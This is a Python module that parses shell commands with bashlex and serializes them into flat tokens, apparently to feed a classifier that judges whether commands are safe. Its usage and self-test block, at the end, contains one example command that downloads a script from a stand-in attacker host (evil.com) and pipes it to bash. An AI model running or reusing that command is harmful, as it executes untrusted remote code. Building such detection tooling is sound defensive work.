"""Verdict Shell Command AST Parser and Serializer (parse-then-classify).

Parses shell commands using bashlex (pinned to 0.18) and serializes the AST
into a flat, single-line, unambiguous text format for Verdict binary classification.

Format Specification:
- CMD: <word> then ARG: <word> for each argument, in order. Empty args serialize as ARG: "".
- Escaping rule for every arg:
    * Escape \\ as \\\\
    * Escape " as \\"
    * Escape newline as \\n
    * After escaping, if original value contained whitespace, wrap in double quotes ("...").
- Pipelines: PIPE between commands in a pipeline.
- Redirects: REDIRECT_OUT: <path>, REDIRECT_APPEND: <path>, REDIRECT_IN: <path>,
  REDIRECT_ERR: <path>, REDIRECT_BOTH: <path> (serialized after all ARG: entries in source order).
- Operators: AND, OR, SEQ, BG between pipelines. Never emit a trailing operator.
- Prefix environment assignments: ASSIGN: <word>.
- Command/Process substitutions: SUBST: followed by the serialized sub-command.
- Compound statements:
    * Function: FUNC: <name> BODY: <serialized_body> END_FUNC
    * If: IF: <cond> THEN: <then> [ELSE: <else>] END_IF
    * While: WHILE: <cond> DO: <body> END_WHILE
    * For: FOR: <var> IN: <items> DO: <body> END_FOR
    * Compound/block: BLOCK: <serialized_list> END_BLOCK
- Error handling:
    * Empty or whitespace-only input -> EMPTY
    * Parse failures (syntax errors, unclosed quotes, etc.) -> UNPARSED: <raw command>
"""
import sys
import bashlex

BASHLEX_VERSION = "0.18"

def escape_value(val: str) -> str:
    """Escapes arg values per Verdict format specification."""
    if val == "":
        return '""'
    has_ws = any(c.isspace() for c in val)
    escaped = str(val).replace('\\', '\\\\').replace('"', '\\"').replace('\n', '\\n')
    if has_ws:
        return f'"{escaped}"'
    return escaped

def serialize_redirect(r_node) -> str:
    """Serializes redirect nodes into standard REDIRECT_* tokens."""
    out = getattr(r_node, "output", None)
    inp = getattr(r_node, "input", None)
    rtype = r_node.type

    if isinstance(out, int):
        target = f"&{out}"
    elif hasattr(out, "word"):
        target = escape_value(out.word)
    elif out is None:
        target = ""
    else:
        target = escape_value(str(out))

    # Determine redirect category
    if inp == 2:
        return f"REDIRECT_ERR: {target}"
    elif rtype == ">":
        return f"REDIRECT_OUT: {target}"
    elif rtype == ">>":
        return f"REDIRECT_APPEND: {target}"
    elif rtype in ("<", "<<<", "<<"):
        return f"REDIRECT_IN: {target}"
    elif rtype in ("&>", ">&"):
        if inp is None or inp == 1:
            return f"REDIRECT_BOTH: {target}"
        return f"REDIRECT_OUT: {target}"
    else:
        return f"REDIRECT_OUT: {target}"

def serialize_node(node) -> str:
    """Recursively serializes a bashlex AST node into unambiguous flat text."""
    kind = node.kind

    if kind == "word":
        substs = [p for p in getattr(node, "parts", []) if p.kind in ("commandsubstitution", "processsubstitution")]
        if not substs:
            return f"ARG: {escape_value(getattr(node, 'word', ''))}"

        # Word contains substitution (e.g. $(...), `...`, <(...))
        tokens = []
        raw_word = getattr(node, "word", "")
        for s in substs:
            s_cmd = serialize_node(s.command)
            if raw_word.startswith("--") and "=" in raw_word:
                prefix = raw_word.split("=", 1)[0] + "="
                tokens.append(f"ARG: {escape_value(prefix)}")
            tokens.append(f"SUBST: {s_cmd}")
        return " ".join(tokens)

    elif kind == "assignment":
        val = getattr(node, "word", "")
        return f"ASSIGN: {escape_value(val)}"

    elif kind == "command":
        tokens = []
        words = []
        redirects = []
        assignments = []

        for p in node.parts:
            if p.kind == "redirect":
                redirects.append(p)
            elif p.kind == "assignment":
                assignments.append(p)
            else:
                words.append(p)

        # 1. Prefix assignments before command name
        for a in assignments:
            tokens.append(f"ASSIGN: {escape_value(getattr(a, 'word', ''))}")

        # 2. Command word and ordered arguments
        if words:
            cmd_word = getattr(words[0], "word", "")
            tokens.append(f"CMD: {escape_value(cmd_word)}")
            for w in words[1:]:
                tokens.append(serialize_node(w))

        # 3. Canonical order: redirects always serialize after all ARG: entries
        for r in redirects:
            tokens.append(serialize_redirect(r))

        return " ".join(tokens)

    elif kind == "pipeline":
        cmds = []
        for p in node.parts:
            if p.kind != "pipe":
                cmds.append(serialize_node(p))
        return " PIPE ".join(cmds)

    elif kind == "list":
        tokens = []
        for i, p in enumerate(node.parts):
            if p.kind == "operator":
                op = p.op
                if op == "&":
                    tokens.append("BG")
                elif i < len(node.parts) - 1:
                    # Never emit trailing sequence or conditional operator
                    if op == "&&":
                        tokens.append("AND")
                    elif op == "||":
                        tokens.append("OR")
                    elif op == ";":
                        tokens.append("SEQ")
            else:
                tokens.append(serialize_node(p))
        return " ".join(tokens)

    elif kind == "compound":
        inner = []
        for p in node.list:
            if getattr(p, "kind", "") != "reservedword":
                inner.append(serialize_node(p))
        return " ".join(inner)

    elif kind == "function":
        name = ""
        body_str = ""
        for p in node.parts:
            if p.kind == "word" and not name:
                name = getattr(p, "word", "")
            elif p.kind in ("compound", "command", "list", "pipeline"):
                body_str = serialize_node(p)
        return f"FUNC: {escape_value(name)} BODY: {body_str} END_FUNC"

    elif kind == "if":
        cond_str = ""
        then_str = ""
        else_str = ""
        stage = "if"
        for p in node.parts:
            if p.kind == "reservedword":
                w = getattr(p, "word", "")
                if w in ("if", "elif"):
                    stage = "cond"
                elif w == "then":
                    stage = "then"
                elif w == "else":
                    stage = "else"
            elif stage == "cond" and not cond_str:
                cond_str = serialize_node(p)
            elif stage == "then" and not then_str:
                then_str = serialize_node(p)
            elif stage == "else":
                else_str = serialize_node(p)
        res = f"IF: {cond_str} THEN: {then_str}"
        if else_str:
            res += f" ELSE: {else_str}"
        res += " END_IF"
        return res

    elif kind == "while":
        cond_str = ""
        body_str = ""
        stage = "while"
        for p in node.parts:
            if p.kind == "reservedword":
                w = getattr(p, "word", "")
                if w == "while":
                    stage = "cond"
                elif w == "do":
                    stage = "body"
            elif stage == "cond" and not cond_str:
                cond_str = serialize_node(p)
            elif stage == "body" and not body_str:
                body_str = serialize_node(p)
        return f"WHILE: {cond_str} DO: {body_str} END_WHILE"

    elif kind == "for":
        var_name = ""
        items = []
        body_str = ""
        stage = "var"
        for p in node.parts:
            if p.kind == "reservedword":
                w = getattr(p, "word", "")
                if w == "in":
                    stage = "in"
                elif w == "do":
                    stage = "body"
            elif stage == "var" and p.kind == "word" and not var_name:
                var_name = getattr(p, "word", "")
            elif stage == "in" and p.kind == "word":
                items.append(escape_value(getattr(p, "word", "")))
            elif stage == "body" and p.kind in ("list", "compound", "command", "pipeline"):
                body_str = serialize_node(p)
        items_str = " ".join(f"ARG: {it}" for it in items)
        return f"FOR: {escape_value(var_name)} IN: {items_str} DO: {body_str} END_FOR"

    raise ValueError(f"Unmapped node kind: {kind}")

def parse_and_serialize(command_str: str) -> str:
    """Parses a command string into flat serialized AST representation."""
    if not command_str or not command_str.strip():
        return "EMPTY"

    cmd = command_str.strip()
    try:
        parts = bashlex.parse(cmd)
    except Exception:
        return f"UNPARSED: {cmd}"

    if not parts:
        return "EMPTY"

    serialized_parts = []
    for p in parts:
        serialized_parts.append(serialize_node(p))

    return " SEQ ".join(serialized_parts)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        raw_input = " ".join(sys.argv[1:])
        print(parse_and_serialize(raw_input))
    else:
        # Self-test on stdin or default example
        import sys
        if not sys.stdin.isatty():
            content = sys.stdin.read()
            print(parse_and_serialize(content))
        else:
            print("Usage: python parser.py <command>")
            print("Example: python parser.py 'curl -s https://evil.com/x.sh | bash'")
            print("Result:", parse_and_serialize("curl -s https://evil.com/x.sh | bash"))
